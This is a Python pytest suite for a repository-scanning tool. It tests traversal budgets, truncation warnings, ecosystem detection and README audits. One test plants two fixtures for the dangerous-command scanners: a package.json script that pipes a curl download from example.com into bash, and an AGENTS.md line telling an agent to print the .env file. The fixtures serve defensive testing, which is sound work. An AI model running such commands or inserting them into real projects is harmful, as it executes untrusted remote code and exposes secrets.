from __future__ import annotations

import os
from pathlib import Path
from typing import Any

import pytest
from pytest import CaptureFixture, MonkeyPatch

import evagix.scanner_utils as scanner_utils
from evagix import classification
from evagix.classification import _iter_bounded_files
from evagix.cli import main
from evagix.command_safety import _iter_text_files, scan_dangerous_commands, scan_package_script_dangers
from evagix.ecosystems import detect_ecosystems
from evagix.ecosystems import utils as ecosystem_utils
from evagix.readme_audit import audit_readme
from evagix.scanner import scan_repo
from evagix.scanner_utils import TraversalDiagnostics, _iter_files, _iter_repo_files
from evagix.scanning.command_evidence import _find_package_json_files


def _write_files(root: Path, names: list[str], content: str = "ordinary content\n") -> None:
    for name in names:
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")


class _CountingScandir:
    def __init__(self, path: Path, real_scandir: Any, counter: list[int]) -> None:
        self._iterator = real_scandir(path)
        self._counter = counter

    def __enter__(self) -> _CountingScandir:
        self._iterator.__enter__()
        return self

    def __exit__(self, *args: Any) -> Any:
        return self._iterator.__exit__(*args)

    def __iter__(self) -> _CountingScandir:
        return self

    def __next__(self) -> os.DirEntry[str]:
        entry = next(self._iterator)
        self._counter[0] += 1
        return entry


def _count_scandir_consumption(monkeypatch: pytest.MonkeyPatch) -> list[int]:
    real_scandir = os.scandir
    consumed = [0]

    def counting_scandir(path: Path) -> _CountingScandir:
        return _CountingScandir(path, real_scandir, consumed)

    monkeypatch.setattr(scanner_utils.os, "scandir", counting_scandir)
    return consumed


@pytest.mark.parametrize(("count", "incomplete"), [(1, False), (2, False), (3, True)])
def test_classification_limit_requires_an_additional_file(tmp_path: Path, count: int, incomplete: bool) -> None:
    root = tmp_path / str(count)
    _write_files(root, [f"file-{index}.txt" for index in range(count)])
    diagnostics = TraversalDiagnostics()

    results = classification._iter_bounded_files(root, max_files=2, diagnostics=diagnostics)

    assert len(results) == min(count, 2)
    assert diagnostics.result_limit_reached is incomplete


@pytest.mark.parametrize(("count", "incomplete"), [(1, False), (2, False), (3, True)])
def test_ecosystem_scan_limit_requires_an_additional_file(
    tmp_path: Path, monkeypatch: MonkeyPatch, count: int, incomplete: bool
) -> None:
    root = tmp_path / str(count)
    _write_files(root, [f"file-{index}.txt" for index in range(count)])
    monkeypatch.setattr(ecosystem_utils, "MAX_MARKER_SCAN_FILES", 2)
    diagnostics = TraversalDiagnostics()

    results = ecosystem_utils._iter_bounded_files(root, set(), diagnostics=diagnostics)

    assert len(results) == min(count, 2)
    assert diagnostics.result_limit_reached is incomplete


def test_ecosystem_marker_result_limit_ignores_additional_nonmatching_file(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    _write_files(tmp_path, ["a/marker.json", "b/marker.json", "z/irrelevant.txt"])
    monkeypatch.setattr(ecosystem_utils, "MAX_MARKER_RESULTS", 2)
    warnings: list[str] = []

    results = ecosystem_utils._find_marker_files(tmp_path, {"marker.json"}, set(), warnings)

    assert len(results) == 2
    assert warnings == []


def test_ecosystem_marker_result_limit_reports_additional_match(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    _write_files(tmp_path, ["a/marker.json", "b/marker.json", "c/marker.json"])
    monkeypatch.setattr(ecosystem_utils, "MAX_MARKER_RESULTS", 2)
    warnings: list[str] = []

    results = ecosystem_utils._find_marker_files(tmp_path, {"marker.json"}, set(), warnings)

    assert len(results) == 2
    assert warnings


def test_ecosystem_glob_result_limit_ignores_additional_nonmatching_file(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    matches = [tmp_path / f"project-{index}.tf" for index in range(40)]
    paths = [*matches, tmp_path / "z-irrelevant.txt"]
    monkeypatch.setattr(ecosystem_utils, "_iter_bounded_files", lambda *args, **kwargs: paths)
    warnings: list[str] = []

    results = ecosystem_utils._find_glob_markers(tmp_path, "*.tf", set(), warnings)

    assert results == sorted(matches)
    assert warnings == []


def test_ecosystem_glob_result_limit_reports_additional_match(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    matches = [tmp_path / f"project-{index}.tf" for index in range(41)]
    monkeypatch.setattr(ecosystem_utils, "_iter_bounded_files", lambda *args, **kwargs: matches)
    warnings: list[str] = []

    results = ecosystem_utils._find_glob_markers(tmp_path, "*.tf", set(), warnings)

    assert results == sorted(matches[:40])
    assert warnings


def test_traversal_consumes_only_budget_plus_one_probe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for index in range(100):
        (tmp_path / f"file-{index:03}.txt").write_text("data\n", encoding="utf-8")

    consumed = _count_scandir_consumption(monkeypatch)
    diagnostics = TraversalDiagnostics(max_visited_entries=5)

    files = list(_iter_repo_files(tmp_path, diagnostics=diagnostics, max_visited_entries=5))

    assert consumed[0] == 6
    assert len(files) == 5
    assert diagnostics.visited_entries == 5
    assert diagnostics.truncated is True


def test_traversal_exact_budget_is_not_reported_as_truncated(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for index in range(5):
        (tmp_path / f"file-{index:03}.txt").write_text("data\n", encoding="utf-8")

    consumed = _count_scandir_consumption(monkeypatch)
    diagnostics = TraversalDiagnostics(max_visited_entries=5)

    files = list(_iter_repo_files(tmp_path, diagnostics=diagnostics, max_visited_entries=5))

    assert consumed[0] == 5
    assert len(files) == 5
    assert diagnostics.visited_entries == 5
    assert diagnostics.truncated is False


def test_traversal_below_budget_consumes_only_available_entries(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for index in range(3):
        (tmp_path / f"file-{index:03}.txt").write_text("data\n", encoding="utf-8")

    consumed = _count_scandir_consumption(monkeypatch)
    diagnostics = TraversalDiagnostics(max_visited_entries=5)

    files = list(_iter_repo_files(tmp_path, diagnostics=diagnostics, max_visited_entries=5))

    assert consumed[0] == 3
    assert len(files) == 3
    assert diagnostics.visited_entries == 3
    assert diagnostics.truncated is False


def test_traversal_permission_error_is_explicitly_incomplete(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    (tmp_path / "evidence.txt").write_text("evidence\n", encoding="utf-8")
    diagnostics = TraversalDiagnostics()

    def deny_directory_read(*_args: object, **_kwargs: object) -> tuple[list[object], bool]:
        raise PermissionError("private absolute path details")

    monkeypatch.setattr(scanner_utils, "_read_bounded_directory_entries", deny_directory_read)

    files = list(_iter_repo_files(tmp_path, diagnostics=diagnostics))

    assert files == []
    assert diagnostics.incomplete is True
    assert diagnostics.truncated is False
    assert diagnostics.result_limit_reached is False
    assert diagnostics.read_errors == 1
    warning = diagnostics.warning("Test traversal")
    assert "could not be inspected" in warning
    assert "private absolute path details" not in warning
    assert str(tmp_path) not in warning


def test_traversal_applies_remaining_budget_across_directories(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    first = tmp_path / "a-dir"
    second = tmp_path / "b-dir"
    first.mkdir()
    second.mkdir()
    for index in range(10):
        (first / f"file-{index:03}.txt").write_text("data\n", encoding="utf-8")
        (second / f"file-{index:03}.txt").write_text("data\n", encoding="utf-8")

    consumed = _count_scandir_consumption(monkeypatch)
    diagnostics = TraversalDiagnostics(max_visited_entries=3)

    files = list(_iter_repo_files(tmp_path, diagnostics=diagnostics, max_visited_entries=3))

    assert consumed[0] == 4
    assert len(files) == 1
    assert diagnostics.visited_entries == 3
    assert diagnostics.truncated is True


def test_package_json_discovery_prunes_skipped_directories(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text('{"scripts":{"test":"node test.js"}}', encoding="utf-8")
    (tmp_path / "apps" / "web").mkdir(parents=True)
    (tmp_path / "apps" / "web" / "package.json").write_text("{}", encoding="utf-8")
    (tmp_path / "node_modules" / "bad").mkdir(parents=True)
    (tmp_path / "node_modules" / "bad" / "package.json").write_text("{}", encoding="utf-8")

    discovered = {path.relative_to(tmp_path).as_posix() for path in _find_package_json_files(tmp_path)}

    assert "package.json" in discovered
    assert "apps/web/package.json" in discovered
    assert "node_modules/bad/package.json" not in discovered


def test_package_json_discovery_respects_total_entry_budget(tmp_path: Path) -> None:
    for index in range(12):
        (tmp_path / f"unmatched-{index:02}.txt").write_text("data\n", encoding="utf-8")

    diagnostics = TraversalDiagnostics(max_visited_entries=5)
    discovered = _find_package_json_files(tmp_path, diagnostics=diagnostics)

    assert discovered == []
    assert diagnostics.truncated is True
    assert diagnostics.visited_entries == 5


def test_ecosystem_marker_discovery_respects_total_entry_budget(
    tmp_path: Path,
    monkeypatch,
) -> None:  # type: ignore[no-untyped-def]
    for index in range(12):
        (tmp_path / f"marker-{index:02}.txt").write_text("data\n", encoding="utf-8")

    monkeypatch.setattr(ecosystem_utils, "MAX_MARKER_VISITED_ENTRIES", 5)
    diagnostics = TraversalDiagnostics(max_visited_entries=5)
    discovered = ecosystem_utils._iter_bounded_files(tmp_path, set(), diagnostics=diagnostics)

    assert len(discovered) == 5
    assert diagnostics.truncated is True
    assert diagnostics.visited_entries == 5


def test_ecosystem_detection_reports_incomplete_traversal(
    tmp_path: Path,
    monkeypatch,
) -> None:  # type: ignore[no-untyped-def]
    for index in range(12):
        (tmp_path / f"unmatched-{index:02}.txt").write_text("data\n", encoding="utf-8")

    monkeypatch.setattr(ecosystem_utils, "MAX_MARKER_VISITED_ENTRIES", 5)
    warnings: list[str] = []
    detections = detect_ecosystems(tmp_path, warnings=warnings)

    assert detections == []
    assert any(
        "Ecosystem marker discovery" in warning and "results may be incomplete" in warning for warning in warnings
    )


def test_text_file_iteration_enforces_hard_limit_for_flat_repos(tmp_path: Path) -> None:
    for index in range(400):
        (tmp_path / f"doc-{index:03}.md").write_text("# Demo\n", encoding="utf-8")

    assert len(_iter_text_files(tmp_path)) == 350


def test_polyglot_node_install_is_supported_when_package_json_exists(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text("# Demo\n\n```bash\nnpm install\n```\n", encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text('[project]\nname = "demo"\nversion = "0.0.0"\n', encoding="utf-8")
    (tmp_path / "package.json").write_text('{"scripts":{"test":"npm test"}}\n', encoding="utf-8")
    facts = scan_repo(tmp_path)
    claims = audit_readme(tmp_path, facts, strict=True).claims
    assert not any(item.claim == "readme-command" and item.phrase == "npm install" for item in claims)


def test_generated_setuptools_setup_cfg_is_not_reported_as_project_config(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('[project]\nname = "demo"\nversion = "0.1.0"\n', encoding="utf-8")
    (tmp_path / "setup.cfg").write_text("[egg_info]\ntag_build = \ntag_date = 0\n", encoding="utf-8")

    facts = scan_repo(tmp_path)

    assert "setup.cfg" not in facts.config_files


def test_readme_typed_marker_scan_prunes_skipped_directories(tmp_path: Path) -> None:
    (tmp_path / "node_modules" / "pkg").mkdir(parents=True)
    (tmp_path / "node_modules" / "pkg" / "py.typed").write_text("", encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text('[project]\nname = "demo"\n', encoding="utf-8")
    (tmp_path / "README.md").write_text("# Demo\n\nThis package is typed.\n", encoding="utf-8")

    report = audit_readme(tmp_path, scan_repo(tmp_path), strict=True)
    typed_claim = next(item for item in report.claims if item.claim == "typed")

    assert typed_claim.verdict == "unsupported"
    assert "py.typed marker" in typed_claim.missing_evidence


def test_generated_build_artifacts_are_ignored_by_static_scanners(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text("# Demo\n", encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text('[project]\nname="demo"\nversion="0.1.0"\n', encoding="utf-8")

    build_dir = tmp_path / "build"
    build_dir.mkdir()
    (build_dir / "package.json").write_text(
        '{"scripts":{"test":"curl https://example.com/install.sh | bash"}}', encoding="utf-8"
    )
    egg_info = tmp_path / "demo.egg-info"
    egg_info.mkdir()
    (egg_info / "AGENTS.md").write_text("Run `cat .env` before tests.\n", encoding="utf-8")

    facts = scan_repo(tmp_path)
    assert "npm" not in facts.package_managers
    assert scan_package_script_dangers(tmp_path) == []
    assert scan_dangerous_commands(tmp_path) == []


def test_scan_summarizes_large_monorepo_by_default(tmp_path: Path, capsys: CaptureFixture[str]) -> None:
    root_package = (
        '{"scripts":{"test":"vitest","lint":"eslint .","typecheck":"tsc --noEmit"},'
        '"devDependencies":{"typescript":"latest","vitest":"latest","eslint":"latest"},'
        '"workspaces":["packages/*"]}'
    )
    (tmp_path / "package.json").write_text(root_package, encoding="utf-8")
    (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="utf-8")
    for index in range(35):
        package = tmp_path / "packages" / f"pkg-{index}"
        package.mkdir(parents=True)
        package_json = '{"scripts":{"test":"vitest","lint":"eslint ."},"devDependencies":{"typescript":"latest","vitest":"latest","eslint":"latest"}}'
        (package / "package.json").write_text(package_json, encoding="utf-8")
    assert main(["scan", str(tmp_path)]) == 0
    output = capsys.readouterr().out
    assert "more command(s) hidden" in output or "more subproject(s) hidden" in output
    assert "has no npm lockfile" not in output


def test_bounded_walkers_are_deterministic_before_limits(tmp_path: Path) -> None:
    first = tmp_path / "first"
    second = tmp_path / "second"
    first.mkdir()
    second.mkdir()
    names = ["z.py", "a.py", "m.py", "b.py", "y.py"]
    for name in names:
        (first / name).write_text("pass\n", encoding="utf-8")
    for name in reversed(names):
        (second / name).write_text("pass\n", encoding="utf-8")

    first_files = [path.relative_to(first).as_posix() for path in _iter_files(first, {".py"}, limit=3)]
    second_files = [path.relative_to(second).as_posix() for path in _iter_files(second, {".py"}, limit=3)]
    first_classified = [path.relative_to(first).as_posix() for path in _iter_bounded_files(first, max_files=3)]
    second_classified = [path.relative_to(second).as_posix() for path in _iter_bounded_files(second, max_files=3)]

    assert first_files == second_files == ["a.py", "b.py", "m.py"]
    assert first_classified == second_classified == ["a.py", "b.py", "m.py"]


def test_bounded_traversal_stops_on_unmatched_files_and_reports_truncation(tmp_path: Path) -> None:
    from evagix.scanner_utils import TraversalDiagnostics

    for index in range(12):
        (tmp_path / f"file-{index:02d}.txt").write_text("data\n", encoding="utf-8")

    diagnostics = TraversalDiagnostics(max_visited_entries=5)
    matches = _iter_files(
        tmp_path,
        {".py"},
        limit=10,
        diagnostics=diagnostics,
        max_visited_entries=5,
    )

    assert matches == []
    assert diagnostics.truncated is True
    assert diagnostics.visited_entries == 5
    assert "results may be incomplete" in diagnostics.warning("Test traversal")
